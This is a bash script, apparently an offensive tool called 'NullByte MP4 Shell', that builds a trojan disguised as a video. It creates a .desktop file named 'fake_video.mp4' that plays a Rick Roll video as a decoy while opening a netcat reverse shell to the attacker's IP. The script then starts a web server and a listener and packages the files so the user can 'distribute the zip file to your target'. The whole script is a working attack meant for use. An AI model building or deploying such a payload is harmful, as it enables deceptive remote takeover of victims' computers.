#!/bin/bash

# Print banner
cat << "EOF"
███╗   ██╗██╗   ██╗██╗     ██╗     ██████╗ ██╗   ██╗████████╗███████╗  
████╗  ██║██║   ██║██║     ██║     ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██╔════╝  
██╔██╗ ██║██║   ██║██║     ██║     ██████╔╝ ╚████╔╝    ██║   █████╗    
██║╚██╗██║██║   ██║██║     ██║     ██╔══██╗  ╚██╔╝     ██║   ██╔══╝    
██║ ╚████║╚██████╔╝███████╗███████╗██████╔╝   ██║      ██║   ███████╗  
╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚══════╝╚═════╝    ╚═╝      ╚═╝   ╚══════╝  
                                                                       
███╗   ███╗██████╗ ██╗  ██╗    ███████╗██╗  ██╗███████╗██╗     ██╗     
████╗ ████║██╔══██╗██║  ██║    ██╔════╝██║  ██║██╔════╝██║     ██║     
██╔████╔██║██████╔╝███████║    ███████╗███████║█████╗  ██║     ██║     
██║╚██╔╝██║██╔═══╝ ╚════██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     
██║ ╚═╝ ██║██║          ██║    ███████║██║  ██║███████╗███████╗███████╗
╚═╝     ╚═╝╚═╝          ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
Automated By Taylor Christian Newsome
EOF

# Step 1: Request the user to input their listener IP
read -p "Enter your listener IP address (e.g., 192.168.1.XX): " listener_ip

# Step 2: Validate the IP address format (simple check)
if [[ ! "$listener_ip" =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
  echo "Invalid IP address format. Exiting..."
  exit 1
fi

# Step 3: Install necessary tools if not already installed
echo "Installing necessary tools..."
apt-get update
apt-get install -y python3 wget curl zip netcat

# Step 4: Create a directory to store the video and payload
mkdir -p /tmp/pythonServer/videos
cd /tmp/pythonServer/videos/

# Step 5: Download YouTube video using youtube-dl (Rick Roll video)
echo "Downloading Rick Roll video..."
curl -L https://yt-dl.org/downloads/latest/youtube-dl -o /usr/local/bin/youtube-dl
chmod a+rx /usr/local/bin/youtube-dl
youtube-dl --restrict-filenames -f 18 'https://www.youtube.com/watch?v=dQw4w9WgXcQ'

# Step 6: Rename the downloaded video for easy reference
mv *.mp4 real_video.mp4

# Step 7: Create the .desktop payload (fake_video.desktop) with dynamic listener IP
echo "Creating the payload..."
cat <<EOF > fake_video.desktop
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=fake_video.mp4
Exec=/usr/bin/wget 'http://$listener_ip/real_video.mp4' -O /tmp/real_video.mp4; /usr/bin/xdg-open /tmp/real_video.mp4; /usr/bin/mkfifo /tmp/f; /bin/nc -e /bin/bash $listener_ip 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1 &
Terminal=false
Type=Application
Icon=video-x-generic
EOF

# Step 8: Make the payload executable
chmod +x fake_video.desktop

# Step 9: Start Python3 HTTP server to serve the video file
echo "Starting HTTP server to serve video..."
python3 -m http.server 80 &

# Step 10: Start Netcat listener to wait for reverse shell connection
echo "Starting Netcat listener on port 1234..."
nc -lvnp 1234

# Step 11: Package files into a ZIP for distribution
zip -r /tmp/videos.zip /tmp/pythonServer/videos/

echo "Payload and server setup complete. Now you can distribute the zip file to your target."
echo "Listener is waiting for a connection on port 1234..."
